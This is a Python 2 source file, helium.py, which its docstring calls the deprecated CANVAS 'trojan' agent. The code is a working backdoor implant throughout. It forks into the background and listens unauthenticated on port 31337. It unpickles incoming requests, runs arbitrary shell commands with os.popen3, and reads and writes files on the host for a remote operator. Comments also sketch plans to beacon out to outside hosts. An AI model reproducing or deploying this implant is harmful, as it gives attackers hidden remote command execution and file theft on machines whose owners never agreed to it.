#! /usr/bin/env python

"""
Note: This code has basically been depreciated, but is included 
for private study.

helium.py - main file for helium startup.

Helium is the CANVAS "trojan" - it runs on the target as a process and acts on
the behalf of the CANVAS user to run exploits and do that sort of thing.

"""

notes="""
packets must be small enough to pass through 512 byte MTU's. 
We can't rely on TCP auto-negotiating this. The majority
of our protocols are datagram based.

All integers are network byte order on the wire.

We start with 4 bytes of length, then four bytes of packet type information,
then the packet

"""

import socket
from threading import Thread
from threading import RLock
import os
import sys
import cStringIO
import cPickle
from other import *


    
class heliuminstance(Thread):
    def __init__(self,protocol,client):
        Thread.__init__(self)
        self.sendlock=RLock()
        self.proto=protocol
        self.client=client
        self.requestidsACK={}
        self.responseidsACK={}
        self.requestsSeen={}
        self.responseids={}
        self.resenders=[]
        self.openFiles={}
        self.fileMutex=RLock()
        self.debug=1
        return
    
    
    def log(self,line):
        #if debug...
        if self.debug:
            print line
        return
        
    def getRequest(self):
        """
        returns a request
        """
        data=reliableRecv(self.client,4)
        size=str2bigendian(data)
        data=reliableRecv(self.client,size)
        request=cPickle.loads(data)
        return request
    
    def handlerequest(self,myrequest):
        #self.log("Got Request ID:%d"%myrequest.id)
        if myrequest.type=="command":
            self.log("Running command %s"%myrequest.command)
            #assume Unix for now
            #FIXED: BUGBUG: doesn't capture stderr???
            pipes=os.popen3(myrequest.command)
            data=pipes[1].read()+pipes[2].read()
            myresponse=commandResponse(data)
            self.queueForSend(myresponse)
            
        elif myrequest.type=="cwd":
            self.log("Changing directory to %s"%myrequest.dir)
            try:
                os.chdir(myrequest.dir)
            except:
                myresponse=errorResponse("Could not change into directory: %s"%myrequest.dir)
                self.queueForSend(myresponse)
                return
            #really a success mesage
            myresponse=errorResponse("Changed into directory: %s"%myrequest.dir)
            self.queueForSend(myresponse)

        elif myrequest.type=="put":
            #broken, please fix.
            self.log("Acquiring file mutex")
            self.fileMutex.acquire()
            filename=myrequest.filename
            offset=myrequest.offset
            self.log("writing to file: %s"%filename)
            if filename in self.openFiles:
                fd=self.openFiles[filename][0]
                totalbytes=self.openFiles[filename][1]
            else:
                #we don't already have it, so open the file and store it
                try:
                    self.log("Opening file for writing: %s"%filename)
                    fd=open(filename,"wb+")
                    totalbytes=0
                    #fd, totalbytes

                except:
                    if self.debug:
                        import traceback
                        print '-'*60
                        traceback.print_exc(file=sys.stdout)
                        print '-'*60
                    myresponse=errorResponse("Could not open file: %s"%filename)
                    self.queueForSend(myresponse)
                    self.log("Releasing filemutex")
                    self.fileMutex.release()
                    return
                self.openFiles[filename]=[fd,totalbytes] 
            self.log("Writing %d bytes to file %s at offset %d"%(len(myrequest.data),
                                                                 myrequest.filename,
                                                                 offset))
            fd.seek(offset)
            fd.write(myrequest.data)
            totalbytes+=len(myrequest.data)
            self.openFiles[filename][1]=totalbytes

            if totalbytes>=myrequest.totalsize:
                self.log("Wrote %d bytes, closing file."%totalbytes)
                fd.close()
                del self.openFiles[filename] 
            self.log("Releasing filemutex")
            self.fileMutex.release()

                
        elif myrequest.type=="get":
            try:
                fd=open(myrequest.filename,"rb")
                fd.seek(0,2)
                #what is the end of the file?
                totalsize=fd.tell()
                fd.seek(0,0) #get back to the beginning
                self.log("Sending %d bytes"%totalsize)
            except:
                myresponse=errorResponse("File not able to be opened: %s"%myrequest.filename)
                self.queueForSend(myresponse)
                return
            self.log("Opened %s to send..."%myrequest.filename)
            #Need to read it and send in chunks...
            #BUGBUG: We still read it all into memory if our sender is slow...
            done=0
            offset=0
            while not done:
                #low number in case MTU is small
                data=fd.read(500)
                if data=="":
                    done=1
                else:
                    myresponse=fileResponse(myrequest.id,offset,data,totalsize)
                    self.queueForSend(myresponse)
                    self.log("Sent offset %d for file %s"%(offset,myrequest.filename))
                    offset+=len(data)
                    #time.sleep(self.mydelay)
                    
        else:
            self.log("Couldn't handle request of type %s"%myrequest.type)

            
        return

    def send(self,myresponse):
        self.log("Sending response of type %s"%myresponse.type)
        #1 for binary. Will this break at 2.3?
        p_response=cPickle.dumps(myresponse,1)
        self.sendlock.acquire()
        size=big_order(len(p_response))
        #self.log("Sending response size %d"%len(p_response))
        reliableSend(self.client,size)
        #self.log("sending data=%s"%prettyprint(p_response))
        reliableSend(self.client,p_response)    
        self.sendlock.release()
        return
    
    def hasAck(self,id):
        """checks for an ack of id == id """
        if id in self.responseidsACK:
            return 1
        return 0
        
    def queueForSend(self,myresponse):
        if myresponse.type=="ack":
            self.send(myresponse)
        else:
            r=resender(myresponse,self)
            self.resenders.append(r)
            r.start()
        return
    
    def removeResender(self,r):
        self.resenders.remove(r)
    
    
    def run(self):
        """ run is called by thread start function"""
        while 1:
            myrequest=self.getRequest()
            self.requestidsACK[myrequest.id]="ACK"
            if myrequest.type!="ack":
                self.log("Sending ack for request %d"%myrequest.id)
                self.queueForSend(requestack(myrequest.id))
                if myrequest.id not in self.requestsSeen:
                    self.requestsSeen[myrequest.id]=1
                    self.handlerequest(myrequest)
            else:
                #register the ack
                self.responseidsACK[myrequest.id]=1
                

            
class heliumfactory:
    def __init__(self):
        self.port=31337
        return
    
    def log(self,line):
        #if debuggging...
        print line
        return
        
    def acceptClient(self):
        #tcp
        newclient=self.sock.accept()
        self.log("Accepted client from %s"%str(newclient[1]))
        h=heliuminstance("tcp",newclient[0])
        h.start()
        return 1
    
    def openSocket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listenhost=""
        listenport=self.port
        self.log("Listening on %s:%d"%(listenhost,listenport))
        try:
            s.bind((listenhost, listenport))
            s.listen(5)
        except:
            #could not listen!
            return 0
        self.sock=s
        return 1
    
    def background(self):
        debug=0
        if debug:
            return 0
        #under unix...
        try:
            if os.fork():
                return 1
        except:
            #win32 or other OS without fork()
            return 0
        
    def run(self):
        self.log("Backgrounding")
        if self.background():
            sys.exit()
            #open listening ports
            #try known outbound hosts on all known outbound protocols
            #protocols: ipv6, ack packets, udp, icmp, tcp 
        if self.openSocket():
            self.log("Socket opened")
            while 1:
                self.acceptClient()
        sys.exit()
        return


VERSION="0.1"

#this stuff happens.
if __name__ == '__main__':
     
    import signal
    signal.signal (signal.SIGINT, signal.SIG_DFL)
    
    #print "Go."
    h = heliumfactory()
    h.run()
    
    
